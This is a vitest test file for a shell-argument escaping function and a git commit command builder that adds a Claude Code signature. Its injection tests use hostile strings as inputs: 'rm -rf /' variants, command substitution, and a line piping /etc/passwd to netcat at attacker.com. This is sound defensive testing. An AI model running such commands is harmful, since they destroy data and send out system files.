import { describe, it, expect } from 'vitest';
import { escapeShellArg, buildGitCommitCommand } from '../shellEscape';

describe('shellEscape', () => {
  describe('escapeShellArg', () => {
    it('should handle empty strings', () => {
      expect(escapeShellArg('')).toBe("''");
    });

    it('should handle simple strings without special characters', () => {
      expect(escapeShellArg('hello')).toBe("'hello'");
      expect(escapeShellArg('test123')).toBe("'test123'");
    });

    it('should escape single quotes in strings', () => {
      expect(escapeShellArg("it's a test")).toBe("'it'\\''s a test'");
      expect(escapeShellArg("don't")).toBe("'don'\\''t'");
    });

    it('should handle strings with multiple single quotes', () => {
      expect(escapeShellArg("it's 'quoted' text")).toBe("'it'\\''s '\\''quoted'\\'' text'");
    });

    describe('command injection prevention', () => {
      it('should prevent basic command injection attempts', () => {
        const malicious = '; rm -rf /';
        const escaped = escapeShellArg(malicious);
        expect(escaped).toBe("'; rm -rf /'");
        // The semicolon is now inside quotes, preventing command execution
      });

      it('should prevent backtick command substitution', () => {
        const malicious = '`rm -rf /`';
        const escaped = escapeShellArg(malicious);
        expect(escaped).toBe("'`rm -rf /`'");
      });

      it('should prevent $() command substitution', () => {
        const malicious = '$(rm -rf /)';
        const escaped = escapeShellArg(malicious);
        expect(escaped).toBe("'$(rm -rf /)'");
      });

      it('should prevent pipe injection', () => {
        const malicious = 'test | nc attacker.com 1234';
        const escaped = escapeShellArg(malicious);
        expect(escaped).toBe("'test | nc attacker.com 1234'");
      });

      it('should prevent output redirection', () => {
        const malicious = 'test > /etc/passwd';
        const escaped = escapeShellArg(malicious);
        expect(escaped).toBe("'test > /etc/passwd'");
      });

      it('should handle complex injection attempts', () => {
        const malicious = "'; cat /etc/passwd | nc attacker.com 1234; echo '";
        const escaped = escapeShellArg(malicious);
        // The actual escaping: ' becomes '\''
        expect(escaped).toBe("''\\''; cat /etc/passwd | nc attacker.com 1234; echo '\\'''");
      });

      it('should prevent newline injection', () => {
        const malicious = 'test\nrm -rf /';
        const escaped = escapeShellArg(malicious);
        expect(escaped).toBe("'test\nrm -rf /'");
      });

      it('should handle null bytes', () => {
        const malicious = 'test\0rm -rf /';
        const escaped = escapeShellArg(malicious);
        expect(escaped).toBe("'test\0rm -rf /'");
      });
    });

    describe('special characters', () => {
      it('should handle double quotes', () => {
        expect(escapeShellArg('say "hello"')).toBe("'say \"hello\"'");
      });

      it('should handle backslashes', () => {
        expect(escapeShellArg('path\\to\\file')).toBe("'path\\to\\file'");
      });

      it('should handle dollar signs', () => {
        expect(escapeShellArg('$PATH')).toBe("'$PATH'");
        expect(escapeShellArg('${HOME}')).toBe("'${HOME}'");
      });

      it('should handle asterisks and glob patterns', () => {
        expect(escapeShellArg('*.txt')).toBe("'*.txt'");
        expect(escapeShellArg('file[1-3].log')).toBe("'file[1-3].log'");
      });

      it('should handle ampersands', () => {
        expect(escapeShellArg('test && echo done')).toBe("'test && echo done'");
        expect(escapeShellArg('background &')).toBe("'background &'");
      });
    });

    describe('edge cases', () => {
      it('should handle very long strings', () => {
        const longString = 'a'.repeat(10000);
        const escaped = escapeShellArg(longString);
        expect(escaped).toBe(`'${longString}'`);
      });

      it('should handle Unicode characters', () => {
        expect(escapeShellArg('Hello 世界')).toBe("'Hello 世界'");
        expect(escapeShellArg('🚀 Emoji test')).toBe("'🚀 Emoji test'");
      });

      it('should handle strings that are only quotes', () => {
        // Three single quotes: each ' becomes '\''
        expect(escapeShellArg("'''")).toBe("''\\'''\\'''\\'''");
      });
    });

    // Note: Windows-specific behavior would need to be tested on Windows
    // The current implementation appears to be Unix-focused
  });

  describe('buildGitCommitCommand', () => {
    it('should build a safe git commit command with signature', () => {
      const message = 'Initial commit';
      const command = buildGitCommitCommand(message);
      expect(command).toContain("git commit -m ");
      expect(command).toContain("Initial commit");
      expect(command).toContain("🤖 Generated with [Claude Code]");
      expect(command).toContain("Co-Authored-By: Claude");
    });

    it('should escape commit messages with single quotes', () => {
      const message = "Fix: don't break on apostrophes";
      const command = buildGitCommitCommand(message);
      expect(command).toContain("Fix: don'\\''t break on apostrophes");
      expect(command).toContain("🤖 Generated with [Claude Code]");
    });

    it('should prevent injection through commit messages', () => {
      const maliciousMessage = "'; rm -rf /; echo 'done";
      const command = buildGitCommitCommand(maliciousMessage);
      // Check that the command structure is preserved
      expect(command).toMatch(/^git commit -m /);
      // The malicious content should be present but escaped
      expect(command).toContain("rm -rf /");
      // Verify the actual command is safe by checking it starts correctly
      expect(command.startsWith("git commit -m '")).toBe(true);
      // And that the dangerous characters are escaped within the quotes
      const messageStart = command.indexOf("git commit -m '") + "git commit -m '".length;
      const escapedContent = command.substring(messageStart);
      expect(escapedContent).toContain("\\'"); // Single quotes are escaped
    });

    it('should handle multi-line commit messages', () => {
      const message = 'First line\n\nDetailed description';
      const command = buildGitCommitCommand(message);
      expect(command).toContain('First line');
      expect(command).toContain('Detailed description');
      expect(command).toContain("🤖 Generated with [Claude Code]");
    });

    it('should handle empty commit messages', () => {
      const command = buildGitCommitCommand('');
      expect(command).toMatch(/^git commit -m /);
      expect(command).toContain("🤖 Generated with [Claude Code]");
    });

    it('should handle commit messages with special git characters', () => {
      const message = 'feat: Add [JIRA-123] #comment Fixed';
      const command = buildGitCommitCommand(message);
      expect(command).toContain('feat: Add [JIRA-123] #comment Fixed');
      expect(command).toContain("🤖 Generated with [Claude Code]");
    });
  });
});